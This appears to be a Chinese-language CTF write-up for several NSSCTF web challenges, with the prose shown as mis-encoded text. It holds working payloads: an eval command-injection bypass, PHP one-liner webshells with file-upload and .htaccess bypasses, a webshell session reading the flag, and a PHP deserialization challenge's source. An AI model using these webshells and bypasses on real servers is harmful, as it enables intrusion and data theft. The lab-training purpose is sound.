<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$get</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$get</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;This is too long.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$get</span>);</span><br><span class="line">          &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç„¶åæŠŠflagæ›¿æ¢æˆç©ºæ ¼<br>è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯ç”¨%09ä¹Ÿå°±æ˜¯åˆ¶è¡¨ç¬¦&#x2F;tä»£æ›¿ç©ºæ ¼<br><code>?get=system(&#39;cat%09/*&#39;)</code>è¿™é‡Œåªèƒ½æŠŠæ ¹ç›®å½•ä¸‹é¢æ‰€æœ‰çš„å†…å®¹éƒ½æ‰“å°å‡ºæ¥ï¼Œä¸è¿‡è¿™é‡Œä¹Ÿå°±åªæœ‰flagäº†<br>æ³•äºŒï¼Œé¢˜ç›®æ˜¯æ‰§è¡Œ<code>get</code>çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è®©è¿™ä¸ªgetå†å»æ‰§è¡Œæˆ‘ä»¬è‡ªå·±è®¾ç½®çš„ä¸€ä¸ªå‚æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">?get=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);&amp;a=<span class="keyword">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ç¬¬ä¸€ä¸ªgetå‚æ•°èµ‹å€¼å®Œä¹‹åè¦å†™ä¸€ä¸ª<code>;</code>,è¿™æ ·å­è¿™å¥è¯ä¸­çš„evalè¯­å¥æ‰ç»“æŸï¼Œç„¶åè¢«å¤–é¢ä¸€å±‚evalè¯†åˆ«ã€‚</p>
<h1 id="Ez-upload"><a href="#Ez-upload" class="headerlink" title="Ez_upload"></a>Ez_upload</h1><p><img src="https://pic1.imgdb.cn/item/67b30478d0e0a243d4003c84.png"><br>ä¸€é“ä¸Šä¼ æ–‡ä»¶çš„é¢˜ç›®ï¼Œæˆ‘å…ˆä¸Šä¼ äº†ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œå‡ºç°<code>åç¼€åä¸èƒ½æœ‰phï¼</code>,è¿™é‡Œå¦‚æœæ˜¯è¯´ä¸èƒ½æ˜¯phpæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸åŒçš„phpåç¼€åï¼Œæ¯”å¦‚php3 php5 phtmlç­‰ç»•è¿‡ã€‚<br>è¿™é‡Œå…ˆæ”¹åç¼€ä¸Šä¼ ï¼Œç„¶åç”¨bpä¿®æ”¹åç¼€çœ‹çœ‹ï¼Œè¿™é‡Œä¹Ÿä¸æ˜¯åœ¨å‰ç«¯å°±æ ¡éªŒï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸è¡Œ<br>é¦–å…ˆæ˜¯ å¦‚æœç›´æ¥ä¸Šä¼ æ™®é€šçš„ä¸€å¥è¯æœ¨é©¬ï¼Œç»™å‡ºçš„é”™è¯¯æ˜¯ä¸èƒ½æœ‰ph<br>ç„¶åæ˜¯æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹,è¿˜æ˜¯æç¤ºæç¤ºä¸èƒ½æœ‰phï¼Œæ‰€ä»¥æ˜¯åœ¨åç«¯åšçš„æ ¡éªŒï¼Œç›´æ¥ä¸Šä¼ jpgæ–‡ä»¶<br>å‘ç°æ˜¾ç¤ºï¼Œè¿˜æ˜¯æ¢ä¸ªç±»å‹å§ï¼Œä½†æ˜¯çœŸçš„jpgè¿™ä¸ªç±»å‹ä¸å¯ä»¥å—ï¼Œæˆ‘æŠŠæ–‡ä»¶çš„å†…å®¹åˆ æ‰ï¼Œå†ä¸Šä¼ <br>å‘ç°å¯ä»¥æˆåŠŸä¸Šä¼ ï¼Œéš¾é“æ˜¯evalè¿™ä¸ªå‡½æ•°çš„æˆ–è€…POSTä¹‹ç±»çš„è¢«è¿‡æ»¤äº†ï¼Œç°åœ¨æŠŠ<code>&lt;?php ?&gt;</code>åˆ å»ï¼Œä¸Šä¼ å‰©ä¸‹çš„evaléƒ¨åˆ†çš„å†…å®¹çš„jpgæ–‡ä»¶  â€“&gt;æˆåŠŸä¸Šä¼ <br>é‚£å°±è¯´æ˜äº†æ˜¯<code>&lt;?php ?&gt; </code>çš„é—®é¢˜äº†ï¼Œåˆ°è¿™æˆ‘ä»¬å°±çŸ¥é“è¦ç”¨scriptç‰ˆæœ¬çš„ä¸€å¥è¯æœ¨é©¬äº†<br>æ‰€ä»¥æœ€å.htaccessé…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼Œè®©ä¸Šä¼ çš„jpgæ–‡ä»¶è§£ææˆphpæ–‡ä»¶ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªæ–‡ä»¶å°±æ˜¯apacheæœåŠ¡å™¨é‡Œé¢æ–‡ä»¶å¤¹ä¸‹çš„1.jpgéƒ½è§£ææˆphpæ–‡ä»¶<br>ç„¶åè¦ç”¨bpæŠ“åŒ…ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ï¼ŒæŠŠcontent-typeä¿®æ”¹ä¸€ä¸‹<br><img src="https://pic1.imgdb.cn/item/67b2f4aed0e0a243d4002fc8.png"><br>ç„¶åå°±å¯ä»¥ç”¨èšå‰‘è¿æ¥äº†ï¼Œä½†æ˜¯è¿™é‡Œçš„flagæ˜¯ç©ºçš„<br><img src="https://pic1.imgdb.cn/item/67b2ffc6d0e0a243d400383d.png"><br>å¦‚æœåœ¨æ ¹ç›®å½•ä¸‹æ²¡æœ‰flagé‚£åŸºæœ¬å°±æ˜¯åœ¨ç¯å¢ƒå˜é‡æˆ–è€…phpinfoé‡Œé¢<br>åœ¨èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯é‡Œé¢è¾“å…¥php -iå°±å¯ä»¥æŸ¥çœ‹phpçš„ä¿¡æ¯äº†åŒ…æ‹¬ç¯å¢ƒå˜é‡ï¼Œç„¶åæ‰¾åˆ°äº†flag<br><img src="https://pic1.imgdb.cn/item/67b3006dd0e0a243d40039c5.png"></p>
<h1 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h1><p><img src="https://pic1.imgdb.cn/item/67b304e8d0e0a243d4003cb2.png"><br>é¢˜ç›®æè¿°ï¼šç®€ç®€å•å•çš„è¿·æƒ‘æ¸¸æˆ<br>ä½†æ˜¯ç”¨f12å’Œå³é”®éƒ½ä¸èƒ½çœ‹æºä»£ç ï¼Œé‚£å°±åœ¨urlä¸­åŠ ä¸Š<code>view-source:</code>å°±èƒ½çœ‹æºä»£ç <br><img src="https://pic1.imgdb.cn/item/67b3066ed0e0a243d4003d4e.png"><br>ç‚¹å‡»é“¾æ¥è·³è½¬åˆ°é¢˜ç›®ä»£ç ç•Œé¢</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LUA"><figure class="iseeu highlight /lua"><table><tr><td class="code"><pre><span class="line">var <span class="built_in">input</span> = $(<span class="string">&#x27;input&#x27;</span>),</span><br><span class="line">    input_val = parseInt(<span class="built_in">input</span>.val()),</span><br><span class="line">    btn_add = $(<span class="string">&#x27;.add&#x27;</span>),</span><br><span class="line">    btn_remove = $(<span class="string">&#x27;.remove&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>.keyup(<span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    input_val = parseInt(<span class="built_in">input</span>.val())</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">btn_add.click(<span class="function"><span class="keyword">function</span><span class="params">(e)</span></span> &#123;</span><br><span class="line">    input_val++;</span><br><span class="line">    <span class="built_in">input</span>.val(input_val);</span><br><span class="line">    console.<span class="built_in">log</span>(input_val);</span><br><span class="line">    <span class="keyword">if</span>(input_val==<span class="number">18</span>)&#123;</span><br><span class="line">        input_val=<span class="number">-20</span>;</span><br><span class="line">        <span class="built_in">input</span>.val(<span class="number">-20</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">btn_remove.click(<span class="function"><span class="keyword">function</span><span class="params">(e)</span></span> &#123;</span><br><span class="line">    input_val<span class="comment">--;</span></span><br><span class="line">    <span class="built_in">input</span>.val(input_val);</span><br><span class="line">&#125;);</span><br><span class="line">// NSSCTF&#123;TnNTY1RmLnBocA==&#125;</span><br></pre></td></tr></table></figure></div>
<p>å…ˆç”¨base64è§£ç ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> TnNTY1RmLnBocA== | <span class="built_in">base64</span> -d</span><br><span class="line">NsScTf.php  </span><br></pre></td></tr></table></figure></div>
<p>æœç„¶ä¸ä¼šè¿™ä¹ˆå¥½å¿ƒç›´æ¥ç»™flag </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå°±æ˜¯å¯¹å®½é«˜åšäº†é™åˆ¶ï¼Œç„¶åä¸å…è®¸phpå‡ºç°æ‰€ä»¥æˆ‘ä»¬ä¹‹å‰ç”¨&lt;?&#x3D;ä»£æ›¿è¿˜æ˜¯æ²¡é”™çš„ï¼Œä¸»è¦å°±æ˜¯å®šä¹‰å®½é«˜<br>åŸæ¥ç›´æ¥åœ¨æ–‡ä»¶é‡Œé¢å®šä¹‰å°±å¥½äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define height 1</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line">&lt;<span class="string">?=</span> <span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸä¸Šä¼ ï¼<br><img src="https://pic1.imgdb.cn/item/67b343ccd0e0a243d4004f14.png"><br><code>Cookie: PHPSESSID=nrd70psbefs9ma416hm6g3qfnc</code>æ‰€ä»¥æˆ‘ä»¬çš„è·¯å¾„å°±åœ¨upload&#x2F;nrd70psbefs9ma416hm6g3qfnc&#x2F;2.php<br>èšå‰‘è¿æ¥è¿›æ¥å‘ç°çœ‹ä¸äº†æ ¹ç›®å½•<br><img src="https://pic1.imgdb.cn/item/67b344dbd0e0a243d4004f48.png"><br>è§£å†³æ–¹æ³•å°±æ˜¯å»èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯é‡Œé¢å»çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html/upload/nrd70psbefs9ma416hm6g3qfnc) $ cd /</span><br><span class="line">(www-data:/) $ ls -al</span><br><span class="line">total 88</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>13:50 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>13:50 ..</span><br><span class="line">-rwxr-xr-x  <span class="number"> 1 </span>root root   <span class="number"> 0 </span>Feb<span class="number"> 17 </span>13:50 .dockerenv</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>bin</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep <span class="number"> 3 </span><span class="number"> 2022 </span>boot</span><br><span class="line">drwxr-xr-x  <span class="number"> 5 </span>root root <span class="number"> 340 </span>Feb<span class="number"> 17 </span>13:50 dev</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>13:50 etc</span><br><span class="line">-rwxrwxrwx  <span class="number"> 1 </span>root root  <span class="number"> 45 </span>Feb<span class="number"> 17 </span>13:50 flag</span><br><span class="line">-rwxrwxrwx  <span class="number"> 1 </span>root root  <span class="number"> 69 </span>Sep<span class="number"> 19 </span><span class="number"> 2022 </span>flag.sh</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep <span class="number"> 3 </span><span class="number"> 2022 </span>home</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>lib</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>lib64</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>media</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>mnt</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>opt</span><br><span class="line">dr-xr-xr-x<span class="number"> 290 </span>root root   <span class="number"> 0 </span>Feb<span class="number"> 17 </span>13:50 proc</span><br><span class="line">drwx------  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>root</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>run</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>sbin</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>srv</span><br><span class="line">dr-xr-xr-x <span class="number"> 13 </span>root root   <span class="number"> 0 </span>Feb<span class="number"> 17 </span>13:50 sys</span><br><span class="line">drwxrwxrwt  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>14:17 tmp</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>usr</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>var</span><br><span class="line">(www-data:/) $ cat flag</span><br><span class="line">NSSCTF&#123;a716da50-93a3-4f5e-8451-fff514e48cc1&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="Power"><a href="#Power" class="headerlink" title="Power!"></a>Power!</h1><p><img src="https://pic1.imgdb.cn/item/67b345cdd0e0a243d4004fb9.png"><br>æŸ¥çœ‹æºç é‡Œé¢ä¸­ æœ‰ä¸€å¥æ³¨é‡Š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ?source= --&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>éšä¾¿è¾“å…¥ä¸€ä¸ªæ–‡ä»¶ä¹‹åï¼Œå°±ç»™å‡ºæºç <code>?source=/etc/passwd</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;hacker.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬çœ‹åˆ°æœ€åæœ‰ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°ï¼Œæ‰€ä»¥è¿™é¢˜æ˜¯ä¸€ä¸ªååºåˆ—åŒ–é“¾çš„é¢˜ç›®<br>å…ˆçœ‹åˆšæ‰è¯»å–æ–‡ä»¶çš„é€»è¾‘åœ¨è¿™å¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_string(<span class="variable">$path</span>)&amp;&amp;!preg_match(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.base64_encode(file_get_contents(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
